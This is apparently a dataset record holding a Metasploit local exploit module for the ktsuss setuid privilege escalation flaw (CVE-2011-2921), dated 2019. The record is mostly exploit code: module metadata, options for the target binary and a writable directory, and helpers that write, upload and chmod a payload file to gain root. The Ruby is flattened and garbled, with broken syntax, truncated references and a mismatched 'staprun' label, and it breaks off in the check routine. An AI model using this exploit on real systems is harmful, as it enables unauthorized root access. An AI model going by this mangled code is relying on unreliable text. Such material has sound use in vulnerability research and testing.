{
    "text": "vul_name : ktsuss 1.4 suid Privilege Escalation ， vul_cve : CVE-2011-2921 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'ktsuss suid Privilege Escalation' ,  ， 'Description' => %q{ ， This module attempts to gain root privileges by exploiting ， a vulnerability in ktsuss versions 1.4 and prior. ， The ktsuss executable is setuid root and does not drop ， privileges prior to executing user specified commands ,  ， resulting in command execution with root privileges. ， This module has been tested successfully on :  ， ktsuss 1.3 on SparkyLinux 6 ( 2019.08 )  ( LXQT )  ( x64 )  ; and ， ktsuss 1.3 on SparkyLinux 5.8 ( LXQT )  ( x64 ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'John Lightsey' ,  # Discovery and exploit ， 'bcoles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => '2011-08-13' ,  ， ' ，  [  ，  [ 'CVE' , '2011-2921' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => ，  [  ， ARCH_X86 ,  ， ARCH_X64 ,  ， ARCH_ARMLE ,  ， ARCH_AARCH64 ,  ， ARCH_PPC ,  ， ARCH_MIPSLE ,  ， ARCH_MIPSBE ，  ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'DefaultOptions' => ， { ， 'AppendExit' => true ,  ， 'PrependSetresuid' => true ,  ， 'PrependSetresgid' => true ,  ， 'PrependSetreuid' => true ,  ， 'PrependSetuid' => true ,  ， 'PrependFork' => true ， } ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptString.new ( 'KTSUSS_PATH' ,  [ true , 'Path to staprun executable' , '/usr/bin/ktsuss' ]  )  ，  ]  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def ktsuss_path ， datastore [ 'KTSUSS_PATH' ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， register_file_for_cleanup path ， end ， upload path , data ， chmod path ， end ， def check ， unless setuid? ktsuss_path ， vprint_error \" # {ktsuss_path} is not setuid\"",
    "time": "2019.09.19"
}